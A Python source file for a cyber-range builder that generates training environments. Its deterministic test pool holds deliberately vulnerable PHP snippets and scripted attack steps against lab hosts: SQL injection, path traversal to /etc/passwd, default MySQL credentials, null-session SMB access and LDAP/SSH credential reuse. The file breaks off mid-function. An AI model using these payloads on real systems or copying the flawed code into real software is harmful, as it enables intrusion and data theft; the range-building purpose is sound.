"""Three SnapshotBuilder implementations for OpenRange.

- LLMSnapshotBuilder: production -- uses litellm to generate snapshot specs
- TemplateOnlyBuilder: testing -- deterministic, no LLM calls
- FileBuilder: demos -- loads a pre-built snapshot from a JSON file

Each builder implements the SnapshotBuilder protocol and returns a validated
SnapshotSpec that can be rendered into Docker artifacts by the SnapshotRenderer.
"""

from __future__ import annotations

import json
import logging
import os
import random
from copy import deepcopy
from pathlib import Path
from typing import Any, Optional

from pydantic import BaseModel, Field

try:
    import litellm
except ImportError:  # pragma: no cover - exercised only without builder extra
    litellm = None

from open_range.protocols import (
    BuildContext,
    EvidenceItem,
    ExploitStep,
    FlagSpec,
    GoldenPathStep,
    NPCPersona,
    NPCTrafficSpec,
    SnapshotSpec,
    TaskSpec,
    TruthGraph,
    Vulnerability,
)

from open_range.builder.prompts import BUILDER_SYSTEM_PROMPT

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# LLM raw output model -- matches the LLM's JSON schema exactly
# ---------------------------------------------------------------------------


class _LLMVulnerability(BaseModel):
    """Raw vulnerability as returned by the LLM."""

    id: str = ""
    type: str = ""
    host: str = ""
    service: str = ""
    injection_point: str = ""
    vulnerable_code: str | dict[str, str] = ""
    root_cause: str = ""
    blast_radius: str = ""
    remediation: str = ""


class _LLMExploitStep(BaseModel):
    """Raw exploit step -- LLM uses 'vuln'/'action'/'yields' field names."""

    vuln: str = ""
    vuln_id: str = ""
    action: str = ""
    command: str = ""
    yields: str = ""
    description: str = ""


class _LLMGoldenPathStep(BaseModel):
    """Raw golden path step -- LLM uses 'cmd' and 'expect_stdout'."""

    step: int = 0
    cmd: str = ""
    command: str = ""
    expect_stdout: str = ""
    expect_in_stdout: str = ""
    description: str = ""
    host: str = "attacker"


class _LLMFlag(BaseModel):
    """Raw flag definition from LLM output."""

    id: str = ""
    value: str = ""
    path: str = ""
    host: str = ""


class _LLMNPCPersona(BaseModel):
    """Raw NPC persona from LLM output."""

    name: str = ""
    role: str = ""
    department: str = ""
    reports_to: str = ""
    communication_style: str = ""
    security_awareness: float = 0.5
    susceptibility: dict[str, Any] = Field(default_factory=dict)
    routine: dict[str, Any] = Field(default_factory=dict)
    accounts: dict[str, Any] = Field(default_factory=dict)


class _LLMTruthGraph(BaseModel):
    """Raw truth graph from LLM output."""

    vulns: list[_LLMVulnerability] = Field(default_factory=list)
    exploit_chain: list[_LLMExploitStep] = Field(default_factory=list)


class _LLMTask(BaseModel):
    """Raw task specification from LLM output."""

    red_briefing: str = ""
    blue_briefing: str = ""


class LLMSnapshotOutput(BaseModel):
    """Intermediate model matching the LLM's raw JSON schema.

    This captures the exact field names the LLM produces, including
    known mismatches like 'vuln' vs 'vuln_id', 'cmd' vs 'command',
    and 'expect_stdout' vs 'expect_in_stdout'. Parsing into this model
    first makes schema mismatches explicit and testable before mapping
    to the canonical SnapshotSpec.
    """

    topology: dict[str, Any] = Field(default_factory=dict)
    truth_graph: _LLMTruthGraph = Field(default_factory=_LLMTruthGraph)
    golden_path: list[_LLMGoldenPathStep] = Field(default_factory=list)
    flags: list[_LLMFlag] = Field(default_factory=list)
    evidence_spec: dict[str, Any] | list[dict[str, Any]] = Field(default_factory=dict)
    npc_personas: list[_LLMNPCPersona] = Field(default_factory=list)
    npc_traffic: dict[str, Any] = Field(default_factory=dict)
    task: _LLMTask = Field(default_factory=_LLMTask)
    files: dict[str, Any] = Field(default_factory=dict)


# ---------------------------------------------------------------------------
# LLM-based builder (production)
# ---------------------------------------------------------------------------


class LLMSnapshotBuilder:
    """Generate snapshot specs via LiteLLM.

    Reads model from ``OPENRANGE_BUILDER_MODEL`` env var.
    Default: ``openai/gpt-5.2-codex``.
    """

    def __init__(
        self,
        model: str | None = None,
        prompt_template: str | None = None,
        temperature: float | None = 0.7,
        max_retries: int = 3,
        max_tokens: int = 32768,
        timeout: float = 120.0,
    ) -> None:
        """Initialize the LLM-based snapshot builder.

        Args:
            model: LiteLLM model identifier (e.g. 'openai/gpt-5.2-codex').
            prompt_template: System prompt override.
            temperature: Sampling temperature for LLM calls. None to omit
                (required for codex models which don't support temperature).
            max_retries: Maximum number of LLM call + parse attempts.
            max_tokens: Maximum tokens in LLM response.
            timeout: Timeout in seconds for each LLM call.
        """
        self.model = model or os.environ.get(
            "OPENRANGE_BUILDER_MODEL", "openai/gpt-5.2-codex"
        )
        self.prompt_template = prompt_template or BUILDER_SYSTEM_PROMPT
        # Codex models don't support temperature; auto-set to None
        if temperature is not None and "codex" in self.model.lower():
            self.temperature = None
        else:
            self.temperature = temperature
        self.max_retries = max_retries
        self.max_tokens = max_tokens
        self.timeout = timeout

    async def build(
        self,
        manifest: dict,
        context: BuildContext,
    ) -> SnapshotSpec:
        """Call LLM to generate a candidate snapshot spec.

        Retries on LLM or parse failures, appending error context to each
        subsequent attempt so the LLM can self-correct.
        """
        if litellm is None:
            raise RuntimeError(
                "LLMSnapshotBuilder requires the optional builder extra. "
                "Install with `pip install open-range[builder]`."
            )

        user_payload = (
            "Generate a complete cybersecurity range snapshot as valid JSON.\n\n"
            + json.dumps(
                {
                    "manifest": manifest,
                    "runtime_context": context.model_dump(),
                },
                indent=2,
            )
        )

        logger.info(
            "LLMSnapshotBuilder: starting build (model=%s, tier=%d)",
            self.model,
            context.tier,
        )

        last_error: Exception | None = None
        last_error_msg: str = ""
        for attempt in range(1, self.max_retries + 1):
            try:
                messages: list[dict[str, str]] = [
                    {"role": "system", "content": self.prompt_template},
                    {"role": "user", "content": user_payload},
                ]
                # If retrying after a failure, append error context so LLM can fix
                if attempt > 1 and last_error_msg:
                    messages.append(
                        {
                            "role": "user",
                            "content": (
                                "Previous attempt failed. "
                                f"Error: {last_error_msg}\n"
                                "Please fix and regenerate the complete JSON."
                            ),
                        }
                    )

                kwargs: dict[str, Any] = {
                    "model": self.model,
                    "messages": messages,
                    "max_tokens": self.max_tokens,
                    "timeout": self.timeout,
                }
                # Codex models don't support temperature
                if self.temperature is not None:
                    kwargs["temperature"] = self.temperature
                # Request JSON output; some models need the word "json"
                # in messages to use json_object format
                kwargs["response_format"] = {"type": "json_object"}

                logger.debug(
                    "LLMSnapshotBuilder: sending request (attempt %d/%d, timeout=%.0fs)",
                    attempt,
                    self.max_retries,
                    self.timeout,
                )
                response = await litellm.acompletion(**kwargs)

                raw = response.choices[0].message.content
                logger.debug(
                    "LLMSnapshotBuilder: received response (%d chars)",
                    len(raw) if raw else 0,
                )
                spec = _parse_llm_response(raw)
                # Hydrate topology with manifest graph (dependency_edges,
                # trust_edges, principal_catalog, host_catalog) so the
                # validator's path_solvability check can verify reachability.
                from open_range.builder.manifest_graph import compile_manifest_topology
                spec.topology = compile_manifest_topology(manifest, spec.topology)
                logger.info(
                    "LLMSnapshotBuilder: build completed (attempt %d/%d, %d vulns, %d golden path steps, %d dep edges)",
                    attempt,
                    self.max_retries,
                    len(spec.truth_graph.vulns),
                    len(spec.golden_path),
                    len(spec.topology.get("dependency_edges", [])),
                )
                return spec

            except json.JSONDecodeError as exc:
                last_error = exc
                last_error_msg = f"JSON parse error at position {exc.pos}: {exc.msg}"
                logger.warning(
                    "LLMSnapshotBuilder attempt %d/%d: JSON parse failed: %s",
                    attempt,
                    self.max_retries,
                    last_error_msg,
                )
            except SnapshotParseError as exc:
                last_error = exc
                last_error_msg = str(exc)
                logger.warning(
                    "LLMSnapshotBuilder attempt %d/%d: snapshot parse failed: %s",
                    attempt,
                    self.max_retries,
                    last_error_msg,
                )
            except Exception as exc:
                last_error = exc
                last_error_msg = f"{type(exc).__name__}: {exc}"
                logger.error(
                    "LLMSnapshotBuilder attempt %d/%d failed: %s",
                    attempt,
                    self.max_retries,
                    last_error_msg,
                )

        raise RuntimeError(
            f"LLMSnapshotBuilder: all {self.max_retries} attempts failed. "
            f"Last error: {last_error}"
        )


# ---------------------------------------------------------------------------
# Parse error with context
# ---------------------------------------------------------------------------


class SnapshotParseError(Exception):
    """Raised when LLM output cannot be parsed into a valid SnapshotSpec.

    Includes the field that failed, received value, expected format,
    and a truncated snippet of the raw JSON for debugging.
    """

    def __init__(
        self,
        message: str,
        field: str = "",
        received: Any = None,
        expected: str = "",
        raw_json_snippet: str = "",
    ) -> None:
        self.field = field
        self.received = received
        self.expected = expected
        self.raw_json_snippet = raw_json_snippet
        parts = [message]
        if field:
            parts.append(f"field={field!r}")
        if received is not None:
            recv_str = repr(received)
            if len(recv_str) > 200:
                recv_str = recv_str[:200] + "..."
            parts.append(f"received={recv_str}")
        if expected:
            parts.append(f"expected={expected}")
        if raw_json_snippet:
            parts.append(f"raw_json_start={raw_json_snippet!r}")
        super().__init__(" | ".join(parts))


# ---------------------------------------------------------------------------
# LLM response parser
# ---------------------------------------------------------------------------


def _parse_llm_response(raw_json: str) -> SnapshotSpec:
    """Parse raw JSON from LLM into a validated SnapshotSpec.

    First parses into LLMSnapshotOutput (which matches the LLM's field names),
    then maps to the canonical SnapshotSpec models. Handles known field-name
    mismatches between the LLM prompt schema and Pydantic models.
    """
    raw_snippet = raw_json[:500] if raw_json else ""

    try:
        data = json.loads(raw_json)
    except json.JSONDecodeError:
        raise

    logger.debug("_parse_llm_response: parsing %d-char JSON response", len(raw_json))

    # Parse into intermediate model first for early validation
    try:
        llm_output = LLMSnapshotOutput.model_validate(data)
    except Exception as exc:
        raise SnapshotParseError(
            "Failed to parse LLM output into LLMSnapshotOutput",
            field="root",
            received=type(exc).__name__,
            expected="valid LLMSnapshotOutput JSON",
            raw_json_snippet=raw_snippet,
        ) from exc

    # Map truth_graph vulns
    vulns = []
    for i, v in enumerate(llm_output.truth_graph.vulns):
        try:
            vulns.append(
                Vulnerability(
                    id=v.id,
                    type=v.type,
                    host=v.host,
                    service=v.service,
                    injection_point=v.injection_point,
                    vulnerable_code=v.vulnerable_code,
                    root_cause=v.root_cause,
                    blast_radius=v.blast_radius,
                    remediation=v.remediation,
                )
            )
        except Exception as exc:
            raise SnapshotParseError(
                f"Failed to map vulnerability at index {i}",
                field=f"truth_graph.vulns[{i}]",
                received=v.model_dump(),
                expected="valid Vulnerability fields",
                raw_json_snippet=raw_snippet,
            ) from exc

    # Map exploit_chain -- LLM uses "vuln"/"action", protocol uses "vuln_id"/"command"
    exploit_chain = []
    for i, ec in enumerate(llm_output.truth_graph.exploit_chain):
        vuln_id = ec.vuln_id or ec.vuln
        command = ec.command or ec.action
        description = ec.description or ec.yields
        if vuln_id or command:
            used_fallback = (not ec.vuln_id and ec.vuln) or (not ec.command and ec.action)
            if used_fallback:
                logger.warning(
                    "exploit_chain[%d]: used fallback field names (vuln=%r -> vuln_id, action=%r -> command)",
                    i,
                    ec.vuln,
                    ec.action,
                )
            exploit_chain.append(
                ExploitStep(
                    vuln_id=vuln_id,
                    command=command,
                    description=description,
                )
            )

    truth_graph = TruthGraph(
        vulns=vulns,
        exploit_chain=exploit_chain,
    )

    # Map golden_path -- LLM uses "cmd"/"expect_stdout", protocol uses "command"/"expect_in_stdout"
    # When both are present, 'cmd' takes precedence (LLM prompt uses 'cmd')
    golden_path = []
    for i, step in enumerate(llm_output.golden_path):
        command = step.cmd or step.command
        expect = step.expect_stdout or step.expect_in_stdout
        if step.cmd and not step.command:
            logger.warning(
                "golden_path[%d]: used 'cmd' fallback for 'command'",
                i,
            )
        if step.expect_stdout and not step.expect_in_stdout:
            logger.warning(
                "golden_path[%d]: used 'expect_stdout' fallback for 'expect_in_stdout'",
                i,
            )
        golden_path.append(
            GoldenPathStep(
                step=step.step,
                command=command,
                expect_in_stdout=expect,
                host=step.host or "attacker",
                description=step.description,
            )
        )

    # Map flags
    flags = []
    for i, f in enumerate(llm_output.flags):
        try:
            flags.append(
                FlagSpec(
                    id=f.id,
                    value=f.value,
                    path=f.path,
                    host=f.host,
                )
            )
        except Exception as exc:
            raise SnapshotParseError(
                f"Failed to map flag at index {i}",
                field=f"flags[{i}]",
                received=f.model_dump(),
                expected="valid FlagSpec (id, value, path, host)",
                raw_json_snippet=raw_snippet,
            ) from exc

    # Map evidence_spec -- LLM returns dict or list, protocol expects list[EvidenceItem]
    evidence_spec: list[EvidenceItem] = []
    evidence_raw = llm_output.evidence_spec
    if isinstance(evidence_raw, dict):
        logger.debug("evidence_spec: converting dict format to list[EvidenceItem]")
        for key, val in evidence_raw.items():
            if isinstance(val, list):
                for item in val:
                    evidence_spec.append(
                        EvidenceItem(type="alert", location=key, pattern=str(item))
                    )
            else:
                evidence_spec.append(
                    EvidenceItem(type="log_entry", location=key, pattern=str(val))
                )
    elif isinstance(evidence_raw, list):
        for item in evidence_raw:
            if isinstance(item, dict):
                evidence_spec.append(EvidenceItem(**item))

    # Map NPC personas
    npc_personas = []
    for i, p in enumerate(llm_output.npc_personas):
        try:
            npc_personas.append(
                NPCPersona(
                    name=p.name,
                    role=p.role,
                    department=p.department,
                    reports_to=p.reports_to,
                    communication_style=p.communication_style,
                    security_awareness=p.security_awareness,
                    susceptibility=p.susceptibility,
                    routine=p.routine,
                    accounts=p.accounts,
                )
            )
        except Exception as exc:
            logger.warning(
                "npc_personas[%d]: failed to map persona %r: %s",
                i,
                p.name,
                exc,
            )

    # Map NPC traffic
    npc_raw = llm_output.npc_traffic
    npc_traffic = NPCTrafficSpec(
        level=0,
        rate_lambda=npc_raw.get("http_rate", 10),
        scripts=["http_traffic.sh", "db_traffic.sh", "ssh_traffic.sh"],
    )

    # Map task
    task = TaskSpec(
        red_briefing=llm_output.task.red_briefing,
        blue_briefing=llm_output.task.blue_briefing,
    )

    # Map files -- explicit files from LLM + extract from vulnerable_code
    files: dict[str, str] = {}

    # 1. Explicit files field from LLM output
    if isinstance(llm_output.files, dict):
        for key, content in llm_output.files.items():
            if isinstance(content, str):
                files[key] = content

    # 2. Extract deployable files from vulnerable_code entries
    for v in vulns:
        vc = v.vulnerable_code
        if isinstance(vc, dict):
            for file_path, code in vc.items():
                container_key = f"{v.host}:{file_path}"
                if container_key not in files:
                    files[container_key] = code
        elif isinstance(vc, str) and vc.strip():
            ip = v.injection_point
            if ip.startswith("/") and v.host == "web":
                container_key = f"web:/var/www/html{ip}"
                if container_key not in files:
                    files[container_key] = vc

    logger.debug(
        "_parse_llm_response: mapped %d vulns, %d golden path steps, %d flags, %d files",
        len(vulns),
        len(golden_path),
        len(flags),
        len(files),
    )

    return SnapshotSpec(
        topology=llm_output.topology,
        truth_graph=truth_graph,
        golden_path=golden_path,
        flags=flags,
        evidence_spec=evidence_spec,
        npc_personas=npc_personas,
        npc_traffic=npc_traffic,
        task=task,
        files=files,
    )


# ---------------------------------------------------------------------------
# Template-only builder (testing)
# ---------------------------------------------------------------------------

# Hardcoded vuln pool for deterministic testing
_DEFAULT_VULN_POOL: list[dict[str, Any]] = [
    {
        "id": "vuln_sqli",
        "type": "sqli",
        "host": "web",
        "service": "nginx+php",
        "injection_point": "/search?q=",
        "vulnerable_code": (
            '<?php $q=$_GET["q"]; '
            '$r=$conn->query("SELECT * FROM products WHERE name LIKE \'%$q%\'"); '
            "while($row=$r->fetch_assoc()) echo $row['name']; ?>"
        ),
        "root_cause": "Unsanitized user input in SQL query",
        "blast_radius": "Full database read access",
        "remediation": "Use parameterized queries",
        "flag_id": "flag1",
        "flag_value": "FLAG{sql1_t3st_f1ag}",
        "flag_path": "/var/flags/flag1.txt",
        "golden_path_steps": [
            {
                "step": 1,
                "cmd": "nmap -sV 10.0.1.0/24",
                "expect_stdout": "80/tcp open http",
                "host": "attacker",
            },
            {
                "step": 2,
                "cmd": "curl http://web/",
                "expect_stdout": "Welcome",
                "host": "attacker",
            },
            {
                "step": 3,
                "cmd": "curl http://web/search?q=test",
                "expect_stdout": "product",
                "host": "attacker",
            },
            {
                "step": 4,
                "cmd": "curl 'http://web/search?q=test%27%20UNION%20SELECT%20flag%20FROM%20flags.secrets--%20'",
                "expect_stdout": "FLAG{sql1_t3st_f1ag}",
                "host": "attacker",
            },
            {
                "step": 5,
                "cmd": "submit_flag FLAG{sql1_t3st_f1ag}",
                "expect_stdout": "correct",
                "host": "attacker",
            },
        ],
    },
    {
        "id": "vuln_idor",
        "type": "idor",
        "host": "web",
        "service": "nginx+php",
        "injection_point": "/api/users/{id}/profile",
        "vulnerable_code": (
            "<?php $id=$_GET['id']; "
            '$stmt=$conn->query("SELECT * FROM users WHERE id=$id"); '
            "echo json_encode($stmt->fetch_assoc()); ?>"
        ),
        "root_cause": "No authorization check on user ID parameter",
        "blast_radius": "User data exposure, credential leakage",
        "remediation": "Add session-based authorization check before query",
        "flag_id": "flag1",
        "flag_value": "FLAG{1d0r_pr0f1le_l3ak}",
        "flag_path": "db:flags.secrets.flag",
        "golden_path_steps": [
            {
                "step": 1,
                "cmd": "nmap -sV 10.0.1.0/24",
                "expect_stdout": "80/tcp open http",
                "host": "attacker",
            },
            {
                "step": 2,
                "cmd": "curl http://web/",
                "expect_stdout": "Welcome",
                "host": "attacker",
            },
            {
                "step": 3,
                "cmd": "curl http://web/api/users/1/profile",
                "expect_stdout": "admin",
                "host": "attacker",
            },
            {
                "step": 4,
                "cmd": "curl http://web/api/users/2/profile",
                "expect_stdout": "password",
                "host": "attacker",
            },
            {
                "step": 5,
                "cmd": "mysql -h db -u leaked_user -pleaked_pass -e 'SELECT flag FROM flags.secrets'",
                "expect_stdout": "FLAG{1d0r_pr0f1le_l3ak}",
                "host": "attacker",
            },
            {
                "step": 6,
                "cmd": "submit_flag FLAG{1d0r_pr0f1le_l3ak}",
                "expect_stdout": "correct",
                "host": "attacker",
            },
        ],
    },
    {
        "id": "vuln_path_traversal",
        "type": "path_traversal",
        "host": "web",
        "service": "nginx+php",
        "injection_point": "/download?file=",
        "vulnerable_code": (
            "<?php $file=$_GET['file']; "
            "readfile('/var/www/uploads/' . $file); ?>"
        ),
        "root_cause": "No path sanitization on file parameter",
        "blast_radius": "Arbitrary file read on web server",
        "remediation": "Validate and sanitize file path, use basename()",
        "flag_id": "flag1",
        "flag_value": "FLAG{p4th_tr4v3rs4l_fl4g}",
        "flag_path": "/var/flags/flag1.txt",
        "golden_path_steps": [
            {
                "step": 1,
                "cmd": "nmap -sV 10.0.1.0/24",
                "expect_stdout": "80/tcp open http",
                "host": "attacker",
            },
            {
                "step": 2,
                "cmd": "curl http://web/",
                "expect_stdout": "Welcome",
                "host": "attacker",
            },
            {
                "step": 3,
                "cmd": "curl http://web/download?file=report.pdf",
                "expect_stdout": "PDF",
                "host": "attacker",
            },
            {
                "step": 4,
                "cmd": "curl 'http://web/download?file=../../../etc/passwd'",
                "expect_stdout": "root:",
                "host": "attacker",
            },
            {
                "step": 5,
                "cmd": "curl 'http://web/download?file=../../../var/flags/flag1.txt'",
                "expect_stdout": "FLAG{p4th_tr4v3rs4l_fl4g}",
                "host": "attacker",
            },
            {
                "step": 6,
                "cmd": "submit_flag FLAG{p4th_tr4v3rs4l_fl4g}",
                "expect_stdout": "correct",
                "host": "attacker",
            },
        ],
    },
    {
        "id": "vuln_weak_creds",
        "type": "weak_creds",
        "host": "db",
        "service": "mysql",
        "injection_point": "mysql -u root -proot",
        "vulnerable_code": "",
        "root_cause": "MySQL root account with default password",
        "blast_radius": "Full database access",
        "remediation": "Change root password, restrict remote root login",
        "flag_id": "flag1",
        "flag_value": "FLAG{w3ak_cr3ds_r00t}",
        "flag_path": "db:flags.secrets.flag",
        "golden_path_steps": [
            {
                "step": 1,
                "cmd": "nmap -sV 10.0.1.0/24",
                "expect_stdout": "80/tcp open http",
                "host": "attacker",
            },
            {
                "step": 2,
                "cmd": "nmap -sV 10.0.2.0/24",
                "expect_stdout": "3306/tcp open mysql",
                "host": "attacker",
            },
            {
                "step": 3,
                "cmd": "mysql -h db -u root -proot -e 'SHOW DATABASES'",
                "expect_stdout": "flags",
                "host": "attacker",
            },
            {
                "step": 4,
                "cmd": "mysql -h db -u root -proot -e 'SELECT flag FROM flags.secrets'",
                "expect_stdout": "FLAG{w3ak_cr3ds_r00t}",
                "host": "attacker",
            },
            {
                "step": 5,
                "cmd": "submit_flag FLAG{w3ak_cr3ds_r00t}",
                "expect_stdout": "correct",
                "host": "attacker",
            },
        ],
    },
    {
        "id": "vuln_smb_misconfig",
        "type": "smb_misconfig",
        "host": "files",
        "service": "samba",
        "injection_point": "smbclient -N //files/general",
        "vulnerable_code": "",
        "root_cause": "Samba share allows guest access (null session) — IT enabled it for a migration and never reverted",
        "blast_radius": "Read access to internal documents, credential files in share",
        "remediation": "Disable guest access, require LDAP authentication for all shares",
        "flag_id": "flag1",
        "flag_value": "FLAG{smb_null_s3ss10n}",
        "flag_path": "/srv/shares/general/admin_creds.txt",
        "golden_path_steps": [
            {
                "step": 1,
                "cmd": "nmap -sV 10.0.1.0/24",
                "expect_stdout": "80/tcp open http",
                "host": "attacker",
            },
            {
                "step": 2,
                "cmd": "nmap -sV -p 445 10.0.2.0/24",
                "expect_stdout": "445/tcp open microsoft-ds",
                "host": "attacker",
            },
            {
                "step": 3,
                "cmd": "smbclient -N -L //files/",
                "expect_stdout": "general",
                "host": "attacker",
            },
            {
                "step": 4,
                "cmd": "smbclient -N //files/general -c 'ls'",
                "expect_stdout": "admin_creds",
                "host": "attacker",
            },
            {
                "step": 5,
                "cmd": "smbclient -N //files/general -c 'get admin_creds.txt /tmp/creds.txt'",
                "expect_stdout": "getting file",
                "host": "attacker",
            },
            {
                "step": 6,
                "cmd": "cat /tmp/creds.txt",
                "expect_stdout": "FLAG{smb_null_s3ss10n}",
                "host": "attacker",
            },
            {
                "step": 7,
                "cmd": "submit_flag FLAG{smb_null_s3ss10n}",
                "expect_stdout": "correct",
                "host": "attacker",
            },
        ],
    },
    {
        "id": "vuln_credential_reuse",
        "type": "credential_reuse",
        "host": "ldap",
        "service": "openldap",
        "injection_point": "LDAP bind with web app service account credentials",
        "vulnerable_code": "",
        "root_cause": "Web app config.php contains LDAP bind DN and password; same credentials reuse for SSH on db host",
        "blast_radius": "Lateral movement from web → db via credential reuse, flag exfiltration",
        "remediation": "Unique credentials per service, rotate LDAP bind password, restrict SSH key-only auth",
        "flag_id": "flag1",
        "flag_value": "FLAG{cr3d_r3us3_p1v0t}",
        "flag_path": "/var/flags/flag1.txt",
        "golden_path_steps": [
            {
                "step": 1,
                "cmd": "nmap -sV 10.0.1.0/24",
                "expect_stdout": "80/tcp open http",
                "host": "attacker",
            },
            {
                "step": 2,
                "cmd": "curl 'http://web/download?file=../../../var/www/config.php'",
                "expect_stdout": "ldap_bind_pw",
                "host": "attacker",
            },
            {
                "step": 3,
                "cmd": "ldapsearch -x -H ldap://ldap -D 'cn=webapp,dc=corp,dc=local' -w 'Svc!Ldap2024' -b 'dc=corp,dc=local' '(uid=*)'",
                "expect_stdout": "dn: uid=",
                "host": "attacker",
            },
            {
                "step": 4,
                "cmd": "sshpass -p 'Svc!Ldap2024' ssh svc_webapp@db 'cat /var/flags/flag1.txt'",
                "expect_stdout": "FLAG{cr3d_r3us3_p1v0t}",
                "host": "attacker",
            },
            {
                "step": 5,
                "cmd": "submit_flag FLAG{cr3d_r3us3_p1v0t}",
                "expect_stdout": "correct",
                "host": "attacker",
            },
        ],
    },
]


class TemplateOnlyBuilder:
    """Deterministic builder for testing -- no LLM calls.

    Picks vulnerabilities from a hardcoded pool based on seed.
    """

    def __init__(self, vuln_pool: list[dict[str, Any]] | None = None) -> None:
        """Initialize with an optional custom vulnerability pool."""
        self.vuln_pool = vuln_pool or _DEFAULT_VULN_POOL

    async def build(
        self,
        manifest: dict,
        context: BuildContext,
    ) -> SnapshotSpec:
        """Build a snapshot deterministically from the vuln pool."""
        rng = random.Random(context.seed if context.seed is not None else 42)

        # Filter pool to allowed bug_families
        allowed = set(manifest.get("bug_families", []))
        candidates = [v for v in self.vuln_pool if v["type"] in allowed]
        if not candidates:
            candidates = list(self.vuln_pool)

        if "prefer_live_admission_compatible_vulns" in context.narrative_hints:
            live_supported = {"sqli", "idor", "path_traversal", "weak_creds"}
            supported = [v for v in candidates if v["type"] in live_supported]
            if supported:
                candidates = supported

        # Avoid recently used vuln classes
        previous = set(context.previous_vuln_classes)
        preferred = [v for v in candidates if v["type"] not in previous]
        if preferred:
            candidates = preferred

        # Pick 1-2 vulns
        max_vulns = manifest.get("difficulty", {}).get("max_vulns", 2)
        min_vulns = manifest.get("difficulty", {}).get("min_vulns", 1)
        count = rng.randint(min_vulns, min(max_vulns, len(candidates)))
        chosen = rng.sample(candidates, count)

        # Build topology from manifest
        topo = manifest.get("topology", {})
        hosts = [h["name"] if isinstance(h, dict) else h for h in topo.get("hosts", [])]
        networks = topo.get("networks", [])
        zones: dict[str, list[str]] = {}
        for h in topo.get("hosts", []):
            if isinstance(h, dict):
                z = h.get("zone", "default")
                zones.setdefault(z, []).append(h["name"])

        topology = {
            "tier": int(manifest.get("tier", context.tier) or context.tier),
            "hosts": hosts,
            "zones": zones,
            "difficulty": manifest.get("difficulty", {}),
            "org_name": manifest.get("company", {}).get("name", "OpenRange"),
            "domain": manifest.get("company", {}).get("domain", "corp.local"),
            "users": _manifest_topology_users(
                manifest,
                seed=context.seed,
                weak_creds_enabled=any(v["type"] == "weak_creds" for v in chosen),
            ),
            "mysql_root_password": "root" if any(v["type"] == "weak_creds" for v in chosen) else "r00tP@ss!",
        }

        # Build truth graph
        vulns = []
        exploit_chain = []
        flags = []
        golden_path: list[GoldenPathStep] = []
        step_offset = 0

        for idx, v in enumerate(chosen):
            vulns.append(
                Vulnerability(
                    id=v["id"],
                    type=v["type"],
                    host=v["host"],
                    service=v.get("service", ""),
                    injection_point=v.get("injection_point", ""),
                    vulnerable_code=v.get("vulnerable_code", ""),
                    root_cause=v.get("root_cause", ""),
                    blast_radius=v.get("blast_radius", ""),
                    remediation=v.get("remediation", ""),
                )
            )
            exploit_chain.append(
                {
                    "vuln_id": v["id"],
                    "command": v.get("injection_point", ""),
                    "description": f"Exploit {v['type']} on {v['host']}",
                }
            )
            flags.append(
                FlagSpec(
                    id=v.get("flag_id", f"flag{idx+1}"),
                    value=v.get("flag_value", f"FLAG{{test_{idx+1}}}"),
                    path=v.get("flag_path", f"/var/flags/flag{idx+1}.txt"),
                    host=v.get("host", "web"),
                )
            )
            for gs in v.get("golden_path_steps", []):
                step_offset += 1
                golden_path.append(
                    GoldenPathStep(
                        step=step_offset,
                        command=gs["cmd"],
                        expect_in_stdout=gs["expect_stdout"],
                        description=gs.get("description", ""),
                    )
                )

        truth_graph = TruthGraph(vulns=vulns, exploit_chain=exploit_chain)

        evidence_spec = [
            EvidenceItem(
                type="log_entry",
                location="web:/var/log/app/access.log",
                pattern="attack pattern from attacker IP",
            ),
            EvidenceItem(
                type="alert",
                location="siem:/var/log/siem/consolidated/all.log",
                pattern="Suspicious activity detected",
            ),
        ]

        company = manifest.get("company", {}) if isinstance(manifest.get("company"), dict) else {}
        company_name = str(company.get("name", "the company"))
        industry = str(company.get("industry", "corporate"))
        task = TaskSpec(
            red_briefing=(
                f"{topology['org_name']} is a {manifest.get('company', {}).get('industry', 'corporate')} "
                "company with web and internal services. "
                "Investigate the environment and capture the flags."
            ),
            blue_briefing=(
                f"You are the SOC analyst for {topology['org_name']}. Monitor the SIEM for suspicious activity, "
                "investigate alerts, and respond to threats."
            ),
        )

        npc_traffic = NPCTrafficSpec(
            level=0,
            rate_lambda=10.0,
            scripts=["http_traffic.sh", "db_traffic.sh"],
        )

        snapshot = SnapshotSpec(
            topology=topology,
            truth_graph=truth_graph,
            golden_path=golden_path,
            flags=flags,
            evidence_spec=evidence_spec,
            npc_personas=[],
            npc_traffic=npc_traffic,
            task=task,
        )
        snapshot.files = render_template_payloads(snapshot, manifest=manifest)
        logger.info(
            "TemplateOnlyBuilder: built snapshot with %d vulns (seed=%s)",
            len(vulns),
            context.seed,
        )
        return snapshot


# ---------------------------------------------------------------------------
# Template payload helpers
# ---------------------------------------------------------------------------


def _manifest_topology_users(
    manifest: dict[str, Any],
    *,
    seed: int | None,
    weak_creds_enabled: bool,
) -> list[dict[str, Any]]:
    raw_users = manifest.get("users", [])
    users: list[dict[str, Any]] = []
    if isinstance(raw_users, list):
        for raw in raw_users:
            if not isinstance(raw, dict):
                continue
            username = str(raw.get("username", "")).strip()
            if not username:
                continue
            department = str(raw.get("department", "")).strip()
            role = str(raw.get("role", "")).strip()
            groups = [
                department.lower().replace(" ", "_")
                for department in [department]
                if department
            ] or ["users"]
            if "it" in department.lower() or "admin" in role.lower():
                groups = ["admins", *groups]
            password = _predictable_user_password(
                username,
                seed=seed,
                weak_creds_enabled=weak_creds_enabled and ("db" in raw.get("hosts", [])),
            )
            users.append(
                {
                    "username": username,
                    "password": password,
                    "groups": list(dict.fromkeys(groups)),
                    "hosts": deepcopy(raw.get("hosts", [])),
                    "email": str(raw.get("email", "")),
                    "full_name": str(raw.get("full_name", "")),
                    "department": department,
                    "role": role,
                }
            )
    if users:
        return users
    return [
        {
            "username": "admin",
            "password": "root" if weak_creds_enabled else "Adm1n!Test",
            "groups": ["admins"],
            "hosts": ["web", "db"],
        },
        {
            "username": "testuser",
            "password": _predictable_user_password(
                "testuser",
                seed=seed,
                weak_creds_enabled=False,
            ),
            "groups": ["users"],
            "hosts": ["web"],
        },
    ]


def render_template_payloads(
    snapshot: SnapshotSpec,
    *,
    manifest: dict[str, Any] | None = None,
) -> dict[str, str]:
    topology = snapshot.topology if isinstance(snapshot.topology, dict) else {}
    flags = snapshot.flags
    evidence_spec = snapshot.evidence_spec
    vuln_types = {v.type for v in snapshot.truth_graph.vulns}
    company = (
        manifest.get("company", {})
        if isinstance(manifest, dict) and isinstance(manifest.get("company"), dict)
        else {}
    )
    company_name = str(topology.get("org_name") or company.get("name") or "OpenRange")
    domain = str(topology.get("domain") or company.get("domain") or "corp.local")

    files: dict[str, str] = {
